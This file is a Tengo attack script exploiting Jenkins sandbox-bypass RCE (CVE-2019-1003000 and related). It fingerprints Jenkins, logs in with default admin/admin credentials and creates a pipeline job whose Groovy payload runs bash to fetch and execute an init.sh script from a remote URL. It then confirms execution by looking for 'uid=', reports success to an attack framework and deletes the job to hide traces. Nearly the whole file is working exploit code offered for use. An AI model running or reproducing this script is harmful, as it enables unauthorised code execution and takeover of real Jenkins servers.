/*
* This jenkins_rce_cve_2019_1003000.tengo is an attack script that attacks target host by jenkins rce
PoC for: SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)
*
*global variable:
*attackTarget
*attackScript
*/

fmt  := import("fmt")
times := import("times")
http := import("http")
json := import("json")
text := import("text")
attack := import("attack")
jenkins := import("jenkins")

JenkinsAttackName := "JenkinsAttackCVE_2019_1003000"
JenkinsAttackType := "JenkinsAttackCVE_2019_1003000"
AttackInitScriptName := "init.sh"

UA := "GoClient"
timeoutMS := 1000

host := attackTarget.ip
port := attackTarget.port
proto := attackTarget.proto

isJenkins := func() {

    jkey := "hudson.model.Hudson.Read"

    isSSL := proto == "https" ||port==443

    client := http.newHttpClient(host,port,isSSL,timeoutMS)

    request := http.newHttpRequest("get","/").addHeader("User-Agent",UA)

    response := client.send(request)

    content := response.getBodyAsString()

    if content == "" {
        return false
    }

    return text.contains(content,jkey)

}

//make attack process and publish into attack tasks and send into sbot
sendAttackResult := func(result) {

    attackProcess := attack.newAttackProcess()
    attackProcess.setIP(host)
    attackProcess.setHost(host)
    attackProcess.setPort(port)
    attackProcess.setProto("jenkins")
    attackProcess.setApp("jenkins")
    attackProcess.setName(JenkinsAttackName)
    attackProcess.setType(JenkinsAttackType)
    attackProcess.setStatus(0)
    attackProcess.setPayload("id;wget....")
    attackProcess.setResult(result)
    //attackProcess.setDetails("")

    //publish attack process into attack tasks
    attackScript.pubProcess(attackProcess)
}

makeCmd := func(){


    jconf := `<?xml version='1.0' encoding='utf8'?>
              <flow-definition plugin="workflow-job@2.31">
                <actions />
                <description />
                <keepDependencies>false</keepDependencies>
                <properties />
                <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps@2.63">
                  <script>
              import org.buildobjects.process.ProcBuilder
              @Grab('org.buildobjects:jproc:2.2.3')
              class Dummy{ }

              print new ProcBuilder("bash").withArgs("-c","%s;id").run().getOutputString()
              </script>
                  <sandbox>true</sandbox>
                </definition>
                <triggers />
                <disabled>false</disabled>
              </flow-definition>`

     initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
     initDownloadCmd := attackScript.initCmdForLinux(initUrl,JenkinsAttackType)

     return fmt.sprintf(jconf,initDownloadCmd)

}

//try to attack
doAttack := func() {

    isSSL := proto == "https" ||port==443
    p := isSSL?"https":"http"

    jobName := "jenkins_job_rce_"+times.time_unix_nano(times.now())/(1000*1000)

    jenkinsClient := jenkins.newJeckinsClient(host,port,p,"admin","admin",timeoutMS)

    jconf := makeCmd()

    //create a new job
    jenkinsClient.createJob(jobName,jconf)

    //build job and run payload

    result := jenkinsClient.buildJobWaitResult(jobName)

    if text.contains(result,"uid=") {

        sendAttackResult(result)
    }

    //delete job
    jenkinsClient.deleteJob(jobName)
}

main := func(){

    if isJenkins() {

        doAttack()
    }
}

main()
